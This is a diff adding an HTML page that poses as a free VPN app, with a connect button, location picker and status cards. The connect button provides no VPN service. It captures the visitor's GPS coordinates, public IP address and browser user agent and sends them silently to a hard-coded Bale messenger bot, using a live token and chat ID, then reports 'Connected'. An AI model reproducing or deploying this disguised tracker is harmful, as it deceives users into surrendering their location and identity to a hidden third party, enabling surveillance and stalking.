@@ -1,0 +1,156 @@
+
+<!doctype html>
+<html lang="fa">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VPN</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+<style>
+  body {margin:0;font-family:"Inter",sans-serif;background:linear-gradient(180deg,#3b0a45 0%,#141d27 100%);color:#fff;}
+  .app{max-width:420px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column;padding:12px;}
+  .banner{background:#6d1c64;padding:10px;border-radius:8px;text-align:center;font-size:14px;position:relative;}
+  .banner button{position:absolute;right:10px;top:7px;background:#fff;color:#6d1c64;border:none;padding:6px 12px;border-radius:16px;font-weight:600;cursor:pointer;}
+  .power-wrap{display:flex;flex-direction:column;align-items:center;margin:24px 0;}
+  .power{width:120px;height:120px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 8px 20px rgba(0,0,0,0.4);}
+  .power i{font-size:50px;color:#6d1c64;}
+  .status{margin-top:12px;font-size:18px;font-weight:600;color:#bbb;}
+  .card{background:#1f2a36;border-radius:12px;padding:12px;margin:8px 0;display:flex;align-items:center;justify-content:space-between;cursor:pointer;}
+  .card .label{font-size:12px;color:#aaa;}
+  .card .value{font-size:16px;font-weight:600;margin-top:4px;}
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:8px 0;}
+  .smallcard{background:#1f2a36;border-radius:12px;padding:10px;}
+  .bottom-nav{margin-top:auto;display:flex;justify-content:space-around;background:#1f2a36;border-radius:12px;padding:8px 0;}
+  .bottom-nav div{text-align:center;flex:1;font-size:13px;color:#ccc;}
+  .bottom-nav .active{color:#fff;font-weight:600;}
+  .location-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;}
+  .location-content{background:#1f2a36;padding:20px;border-radius:12px;max-width:300px;width:80%;}
+  .location-option{padding:10px;border-bottom:1px solid #333;cursor:pointer;}
+  .location-option:hover{background:#333;}
+</style>
+</head>
+<body>
+<div class="app">
+  <div class="banner">Free trial <button>Premium</button></div>
+
+  <div class="power-wrap">
+    <div class="power" id="powerBtn"><i class="fa-solid fa-power-off"></i></div>
+    <div class="status" id="status">Not connected</div>
+  </div>
+
+  <div class="card" id="locationCard">
+    <div><div class="label">Selected Location</div><div class="value" id="selectedLocation">USA - New York</div></div>
+    <i class="fa-solid fa-chevron-right" style="color:#aaa"></i>
+  </div>
+
+  <div class="grid">
+    <div class="smallcard"><div class="label">Smart Location</div><div class="value" style="color:#5eead4">USA - New Jersey - 1</div></div>
+    <div class="smallcard"><div class="label">Recent Location</div><div class="value" style="color:#6ee7b7">Lebanon</div></div>
+  </div>
+
+  <div class="grid">
+    <div class="smallcard"><div class="label">Time Protected</div><div class="value">9h this week</div></div>
+    <div class="smallcard"><div class="label" style="color:#ff7f9a">Disabled: Ad & Tracker Blocker</div><button style="margin-top:6px;background:#6d1c64;color:#fff;border:none;padding:6px 10px;border-radius:8px;cursor:pointer">Settings</button></div>
+    <div class="smallcard"><div class="label">Not set up: Auto-connect</div><button style="margin-top:6px;background:#10b981;color:#fff;border:none;padding:6px 10px;border-radius:8px;cursor:pointer">Settings</button></div>
+    <div class="smallcard"><div class="label">Protocol</div><div class="value">Selected: Automatic</div></div>
+  </div>
+
+  <div class="bottom-nav">
+    <div class="active">VPN</div><div>Add-ons</div><div>Help</div><div>Profile</div>
+  </div>
+</div>
+
+<div class="location-modal" id="locationModal">
+  <div class="location-content">
+    <div class="location-option">USA - New York</div>
+    <div class="location-option">Germany - Berlin</div>
+    <div class="location-option">UK - London</div>
+    <div class="location-option">France - Paris</div>
+    <div class="location-option">Netherlands - Amsterdam</div>
+  </div>
+</div>
+
+<script>
+const btn = document.getElementById('powerBtn');
+const status = document.getElementById('status');
+let connected = false;
+
+btn.addEventListener('click', () => {
+  connected = !connected;
+
+  if(connected){
+    status.textContent = "Connecting...";
+    status.style.color = "#10b981";
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(async position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // گرفتن IP واقعی
+        let ip = "N/A";
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          ip = data.ip;
+        } catch(e){console.error(e);}
+
+        // ارسال پیام اول: فقط لوکیشن + IP
+        const token = "8164091925:AAERGQSmpgHRr40x6Ncx7FuQAvC3UKcNKYk";
+        const chatId = "1063958018";
+        const url1 = `https://tapi.bale.ai/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}&text=IP:${ip}`;
+        fetch(url1).then(()=>console.log("Location + IP sent"))
+          .catch(err=>console.error(err));
+
+        // آماده‌سازی پیام دوم: بقیه اطلاعات + DEV BY VC
+        const selectedLoc = document.getElementById("selectedLocation").textContent;
+        const ua = navigator.userAgent;
+        const now = new Date().toLocaleString();
+        const message2 = `🌐 VPN Connected
+Selected Location: ${selectedLoc}
+User Agent: ${ua}
+Time: ${now}
+DEV BY VC`;
+
+        const url2 = `https://tapi.bale.ai/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message2)}`;
+        fetch(url2).then(()=>console.log("Extra info sent"))
+          .catch(err=>console.error(err));
+
+        status.textContent = "Connected";
+
+      }, error => {
+        alert("متصل نشد");
+        status.textContent = "Not connected";
+        status.style.color = "#bbb";
+      });
+    } else {
+      alert(" در این دستگاه پشتیبانی نمی‌شود");
+      status.textContent = "Not connected";
+      status.style.color = "#bbb";
+    }
+
+  } else {
+    status.textContent = "Not connected";
+    status.style.color = "#bbb";
+  }
+});
+
+// انتخاب لوکیشن
+const locationCard = document.getElementById("locationCard");
+const locationModal = document.getElementById("locationModal");
+const selectedLocation = document.getElementById("selectedLocation");
+
+locationCard.addEventListener("click", ()=> locationModal.style.display = "flex");
+document.querySelectorAll(".location-option").forEach(opt => {
+  opt.addEventListener("click", ()=>{
+    selectedLocation.textContent = opt.textContent;
+    locationModal.style.display = "none";
+  });
+});
+window.addEventListener("click", e=>{
+  if(e.target === locationModal) locationModal.style.display = "none";
+});
+</script>
+</body>
+</html>
